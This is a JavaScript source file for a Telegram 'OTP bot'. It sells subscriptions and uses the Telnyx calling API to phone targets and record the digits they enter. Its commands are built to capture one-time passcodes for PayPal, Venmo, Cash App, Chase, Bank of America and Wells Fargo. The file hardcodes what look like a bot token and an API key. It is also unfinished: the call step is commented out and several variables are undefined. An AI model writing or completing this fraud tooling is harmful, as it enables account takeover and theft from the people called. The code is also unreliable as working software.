const { Telegraf } = require('telegraf'); // importing telegraf.js
const bot_token = '6328468760:AAFlRNuKnTwAMynlXcsAH118kYhBhahUNQU'
var bot = new Telegraf(bot_token)

// TELNYX STUFF 
const MY_API_KEY = 'ASGHJ2J623RV34I3C63VTEY8C'
const telnyx = require('telnyx')('MY_API_KEY');
const WEBHOOK_URL = 'https://automated-call-service.pages.dev/';

const express = require('express');
const app = express();
const port = process.env.PORT || 3000;

async function call (service_number, customer_number, ctx){
   console.log(ctx)
   bot.telegram.sendMessage(ctx.chat.id, `call ongoing...\n Calling ${customer_number} \n please wait...`, {})

   // Use the Telnyx API to create a new call
   await telnyx.calls.create({
      connection_id: ENV_TELNYX_CONNECTION_ID,
      to: customer_number,
      from: ENV_TELNYX_PHONE_NUMBER,
      webhook_url: WEBHOOK_URL
   });

}


//  COMMANDS
bot.on('start', ctx => {
   console.log(ctx.from)
   bot.telegram.sendMessage(
      ctx.chat.id, `
      𝕆𝔽𝔹𝕋ℂ 𝕆𝕋ℙ 𝔹𝕆𝕋! \n 
      ➤ Type: /purchase to subscribe \n 
      👤 USER COMMANDS 👤 \n
      ➤ /redeem - Redeem your key\n
      ➤ /checktime - Check subscription time left\n\n
      📞 CALL COMMANDS 📞 \n 
      ➤ /call - Capture OTP (Paypal, Venmo, cashapp...)\n
      ➤ /bank - Capture bank OTP\n
      ➤ /boa - Capture boa OTP\n
      ➤ /chase - Capture chase OTP\n
      ➤ /wellsfargo - Capture Wells fargo OTP\n
      ➤ /venmo - Capture venmo OTP\n
      ➤ /paypal - Capture bank OTP\n      
      `, {})
})

bot.help(ctx => ctx.reply(`
   𝕆𝔽𝔹𝕋ℂ 𝕆𝕋ℙ 𝔹𝕆𝕋! \n 
➤ Type: /purchase to subscribe \n 
👤 USER COMMANDS 👤 \n
➤ /redeem - Redeem your key\n
➤ /checktime - Check subscription time left\n\n
📞 CALL COMMANDS 📞 \n 
➤ /call - Capture OTP (Paypal, Venmo, cashapp...)\n
➤ /bank - Capture bank OTP\n
➤ /boa - Capture boa OTP\n
➤ /chase - Capture chase OTP\n
➤ /wellsfargo - Capture Wells fargo OTP\n
➤ /venmo - Capture venmo OTP\n
➤ /paypal - Capture bank OTP\n
`))

bot.command('start', ctx => {
   console.log(ctx)
   const number = ctx.message.text.split(' ');
   const service = [ 'paypal', 'venmo', 'boa', 'chase', 'bank', 'cashapp' ]

   if(!number[1] || !service.includes(number[3])){
      bot.telegram.sendMessage(ctx.chat.id, `❌( Error )❌ : Invalid number or service not available`, {}).then(() => {})
   }
   else{
      bot.telegram.sendMessage(ctx.chat.id, `Call has Started...`, {
         reply_markup:{
            inline_keyboard: [
               [
                  {
                     text: 'End Call',
                     callback_data: 'end'
                  }               
               ]
            ]
         }
      }).then(() =>{
         console.log('yay')
         // call(number[2], number[3], ctx)
      })      
   }


})

bot.launch();

app.post('/process_gather', (req, res) => {
   const digits = req.body.Digits;
   console.log(digits);
   res.send(`
   <Response>
      <Say>You entered ${digits}</Say>
   </Response>
   `);
 });
 
 app.listen(port, () => {
   console.log(`Server running on port ${port}`);
 });
 

